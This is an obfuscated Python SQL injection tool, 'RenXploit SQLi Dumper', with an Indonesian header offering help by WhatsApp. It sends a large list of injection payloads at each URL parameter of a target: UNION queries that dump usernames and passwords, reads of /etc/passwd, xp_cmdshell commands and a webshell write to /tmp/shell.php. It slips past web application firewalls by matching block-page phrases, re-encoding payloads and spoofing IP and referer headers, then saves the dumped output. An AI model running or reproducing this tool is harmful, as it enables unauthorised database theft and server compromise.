"""
berikut adalah script untuk Dump DB SQLi
kalau ada yang error silahkan chat admin: https://wa.me/+6289519450908
"""
#!/usr/bin/env python3
R='store_true'
Q='masukan_file_yang_berisi_user-agent'
M="' OR EXISTS(SELECT * FROM users)--"
L="' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables--"
I="' UNION ALL SELECT NULL,NULL,NULL--"
F=True
D=Exception
K=open
H=None
B=int
G=print
import argparse as S,asyncio as J,random as E,sys,aiohttp as N,urllib.parse,os,re
from bs4 import BeautifulSoup as W
X=["' OR 1=1--","' OR '1'='1'--","') OR ('1'='1'--",I,"' UNION SELECT table_name FROM information_schema.tables--","' UNION SELECT column_name FROM information_schema.columns--","' UNION SELECT NULL,version(),NULL--","' UNION SELECT NULL,current_user(),NULL--","' AND updatexml(1,concat(0x7e,(SELECT database())))--+","' AND extractvalue(1,concat(0x7e,(SELECT version())))--+","' OR SLEEP(5)--","' AND 1=1 AND BENCHMARK(100000,MD5('test'))--",L,"' AND (SELECT COUNT() FROM users) > 0--","' OR EXISTS(SELECT * FROM admin)--","' AND ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>64--","' OR LOAD_FILE('/etc/passwd')--","' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--","' AND SLEEP(3)#","'; EXEC xp_cmdshell('whoami')--","' OR 1=1#","' OR 'a'='a'#","' OR 'x'='x'--","' OR true--",'" OR ""=""--','" OR 1=1--','" OR \'1\'=\'1\'#','") OR ("a"="a")--',"') OR ('x'='x')#",M,"' AND NOT EXISTS(SELECT * FROM admin)#","' OR 1=1 LIMIT 1--","' OR 1=1 LIMIT 1#","admin'--","admin'#","admin'/*","' OR 'test'='test'--","' OR (SELECT user())='root'--","' OR (SELECT COUNT(*) FROM information_schema.tables)>0--","' OR (SELECT @@version) LIKE '%5.%'--","' UNION SELECT 1,2,3--","' UNION ALL SELECT 1,username,password FROM users--","' UNION SELECT null,null,null,null--","' UNION SELECT table_name,2,3 FROM information_schema.tables--","' UNION SELECT column_name,2,3 FROM information_schema.columns--","' UNION /*!50000SELECT*/1,2,3--","' UNION /*!50002ALL*/SELECT 1,2,3--","' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/shell.php'--","' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users--","' UNION SELECT NULL,CONCAT_WS(':',user,password),NULL FROM mysql.user--","' UNION /*!UNION*/SELECT 1,2,3--","' UNION SELECT 1,2,CONCAT(database(),0x3a,version())--","' UNION SELECT NULL,CONCAT_WS(0x3a,table_name,column_name),NULL FROM information_schema.columns--",I,"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",L,"' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns--","' UNION SELECT NULL,group_concat(table_name,0x3a,column_name),NULL FROM information_schema.columns--","' UNION SELECT NULL,version(),database()--","' UNION SELECT user(),database(),version()--","' UNION SELECT NULL,@@hostname,NULL--","' UNION SELECT NULL,@@datadir,NULL--","' UNION SELECT NULL,@@basedir,NULL--","' UNION SELECT NULL,@@datadir,@@version_comment--","' UNION SELECT NULL,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),NULL--","' UNION SELECT NULL,(SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables),NULL--","' UNION ALL SELECT 1,2,3--","' UNION SELECT 'a','b','c'--","' UNION SELECT 0x616161,0x626262,0x636363--","' UNION SELECT 1,2,3#","' UNION SELECT 1,2,3/*","' AND (SELECT 1/0)--","' AND 1 IN (SELECT MIN(name) FROM users WHERE name LIKE '%')--","' OR (SELECT load_file('/etc/passwd'))--","' AND extractvalue(1,concat(0x3a,(SELECT user())))--","' AND updatexml(null,concat(0x3a,(SELECT version())),null)--","' OR exp(~(1))--","' OR exp(1)--","' OR floor(rand(0)*2) GROUP BY version()--","' OR (SELECT COUNT(*) FROM nonexistent_table) IS NOT NULL--","' OR (SELECT COUNT(password) FROM users WHERE password!='')--","' OR (SELECT COUNT(*) FROM users HAVING COUNT(*)>1)--","' OR (SELECT CONCAT(CHAR(71,65,67,67,79,82)))--","' OR (SELECT CHAR_LENGTH(database()))--","' OR (SELECT COLLATION('utf8mb4'))--","' AND 1=CONVERT(int,@@version)--","' OR ROW_NUMBER() OVER()--","' OR JSON_QUOTE(database())--","' OR JSON_LENGTH(table_name) FROM information_schema.tables--","' OR TO_BASE64(user())--","' OR FROM_BASE64('aGVsbG8=')--","' OR HEX(version())--","' OR UNHEX('616263')--","' OR ORD(substr((SELECT database()),1,1))>0--","' OR ASCII(substr((SELECT database()),2,1))>0--","' OR (SELECT LENGTH(password) FROM users LIMIT 1)=8--","' OR COALESCE((SELECT user()),0x00) IS NOT NULL--","' OR UUID() LIKE '____-____-____-____'--","' OR CONCAT_WS('-',user(),database())--","' OR CONCAT_WS(0x3a,database(),version())--","' AND (SELECT COUNT(*) FROM information_schema.views)>0--",M,"' OR EXISTS(SELECT * FROM mysql.db)--","' OR EXISTS(SELECT * FROM mysql.tables_priv)--","' OR EXISTS(SELECT * FROM performance_schema.threads)--","' OR EXISTS(SELECT * FROM performance_schema.events_waits_summary_global_by_event_name)--","' OR (SELECT COUNT(schema_name) FROM information_schema.schemata)>1--","' OR (SELECT COUNT(table_name) FROM information_schema.tables)>5--","' OR (SELECT COUNT(column_name) FROM information_schema.columns)>10--","' OR (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata) IS NOT NULL--","' OR (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables) REGEXP '[a-z]'--"]
Y=['access denied','request blocked','forbidden','waf','malicious request','security firewall','web application firewall','your request has been blocked','403 forbidden','not allowed','blocked by waf','blocked request','forbidden access','access to this resource is denied','your request looks suspicious','unauthorized activity','threat detected','blocked by security rules','suspicious activity detected','blocked due to security policy','attack detected','rule violation','security rule triggered','mod_security','modsecurity','waf protection','this request has been blocked','incident id','blocked for security reasons','your request was rejected','cloudflare','akamai error','imperva','barracuda','aws waf','sucuri website firewall','blocked by sucuri','blocked by cloudflare','ddos protection by','connection terminated','connection reset','nginx 403','nginx waf','apache modsecurity','security restrictions','invalid request','your request could not be processed','webshield block','you have been blocked','blocked by server','request denied','this request was blocked','error 403','security incident','access is denied','blocked due to ruleset','request violates security rules','policy violation','detected suspicious behavior','application firewall detected this request','this action has been blocked','site protection','blocked ip','ip address blocked','request terminated','unauthorized request','blocked by edge firewall','firewall alert','detected attack pattern','access restricted','protection activated','request not permitted','http error 403','violation of security policy','blocked due to firewall policy','perimeterx','blocked by perimeterx','threat protection activated','blacklisted request','request has been denied','you are not authorized to view this page','security plugin block','site locked','denied by security policy','request does not comply','exceeded rate limit','invalid traffic pattern','blocked by rate limiter','user agent blocked','known bad request','automated request blocked','challenge failed','not permitted','access not allowed','host denied','deny rule match','firewall error','this page is protected','request failed security checks','blocked content','malicious input detected','blocked keyword','possible injection attack']
O='result_gacor_v5.txt'
def Z(filename=Q):
	try:
		with K(filename,'r')as B:A=[A.strip()for A in B if A.strip()]
	except D:A=[]
	if not A:A=['Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Mozilla/5.0 (Linux x86_64)','Mozilla/5.0 (Android 13; Mobile)','Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)','curl/7.85.0','Wget/1.21.3']
	return A
def a(filename):
	try:
		with K(filename,'r')as A:return[A.strip()for A in A if A.strip()]
	except D as B:G(f"[!] Failed loading proxies: {B}");return[]
def b():return'.'.join(str(E.randint(1,254))for A in range(4))
def c(payload):A=payload;B=[A,urllib.parse.quote_plus(A),A.replace(' ','/**/'),A.upper(),urllib.parse.quote_plus(urllib.parse.quote_plus(A))];return list(dict.fromkeys(B))
def d(base='hasil-sql',ext='.txt'):
	C=ext;A=base;F=re.compile(f"^{re.escape(A)}(\\d*){re.escape(C)}$");D=[]
	for G in os.listdir('.'):
		E=F.match(G)
		if E:D.append(B(E.group(1))if E.group(1)else 1)
	if not D:return f"{A}{C}"
	return f"{A}{max(D)+1}{C}"
def e(target,payload_list,param):
	A=param;B=urllib.parse.urlparse(target);C=dict(urllib.parse.parse_qsl(B.query,keep_blank_values=F))
	if A not in C:G(f"[!] Parameter '{A}' not found in URL.");sys.exit(1)
	D=[]
	for E in payload_list:H=C.copy();H[A]=E;I=urllib.parse.urlencode(H,doseq=F);J=B._replace(query=I);D.append((E,urllib.parse.urlunparse(J)))
	return D
async def P(session,url,headers,proxy=H,timeout=8):
	A=proxy
	try:
		B={'timeout':timeout}
		if A:B['proxy']=A
		async with session.get(url,headers=headers,**B)as C:return C.status,await C.text()
	except D:return H,H
async def T(args):
	A=args;f=Z(A.ua_file);Q=a(A.proxy_file)if A.proxy_file else[];R=[]
	for g in X:R.extend(c(g))
	h=urllib.parse.urlparse(A.target);S=[A.param]if A.param else[A for(A,B)in urllib.parse.parse_qsl(h.query)];T=[]
	for B in S:
		G(f"[i] Testing parameter: {B}");i=e(A.target,R,B)
		async with N.ClientSession(connector=N.TCPConnector(ssl=False))as U:
			V=[]
			for(C,j)in i:
				async def k(p=C,u=j):
					C={'User-Agent':E.choice(f),'Accept':'*/*'}
					if A.stealth:C['Referer']=A.referer or f"https://google.com/search?q={E.randint(1000,9999)}";C['X-Forwarded-For']=b();await J.sleep(E.uniform(0,A.max_delay))
					G=E.choice(Q)if Q else H;F,D=await P(U,u,C,G,A.timeout)
					if A.auto_encode and(F in(403,414)or D and any(A in D.lower()for A in Y)):I=urllib.parse.quote_plus(p);K=u.replace(urllib.parse.quote_plus(p),I);C['X-SQLi-Attempt']='encoded';F,D=await P(U,K,C,G,A.timeout);L=f"{p} [encoded]";return B,L,F,D
					return B,p,F,D
				V.append(k())
			l=await J.gather(*V)
		for(L,C,D,M)in l:
			F=''
			if D==200 and M and len(M)>A.min_length:F=W(M,'html.parser').get_text()[:1000]
			T.append((L,C,D,F))
	if A.output_file==O:A.output_file=d()
	with K(A.output_file,'w',encoding='utf-8')as I:
		for B in S:
			I.write(f"=== Parameter: {B} ===\n")
			for(L,C,D,F)in T:
				if L!=B:continue
				if D==200 and F:I.write(f"[+] Payload: {C}\nDump: {F}\n{"="*60}\n")
				else:m='No dump'if D else'Error/Timeout';I.write(f"[-] Payload: {C}\nReason: {m} (HTTP {D})\n{"-"*60}\n")
			I.write('\n')
	G(f"\n[+] Results saved to {A.output_file}")
if __name__=='__main__':
	A=S.ArgumentParser(description='RenXploit SQLi Dumper v1.2');A.add_argument('-t','--target',required=F,help='masukin url sama parameter nya');A.add_argument('--param',help='Specific parameter to test (auto-all if omitted)');A.add_argument('-u','--ua-file',default=Q,help='masukin nama file yg isi nya user-agent');A.add_argument('-p','--proxy-file',help='masukin nama file yg isi nya proxy');A.add_argument('-c','--concurrency',type=B,default=10,help='Concurrent requests');A.add_argument('-T','--timeout',type=B,default=8,help='Request timeout');A.add_argument('-o','--output-file',default=O,help='Output file');A.add_argument('--min-length',type=B,default=500,help='Min length for dumps');A.add_argument('--stealth',action=R,help='Enable stealth mode');A.add_argument('--max-delay',type=float,default=2.,help='Max stealth delay');A.add_argument('--auto-encode',action=R,help='Auto encode on WAF detection');A.add_argument('--referer',help='Custom Referer if stealth');C=A.parse_args()
	if'?'not in C.target or'='not in C.target:sys.exit("[!] Target URL must contain parameters, e.g. '?a=1&b=2'")
	J.run(T(C))
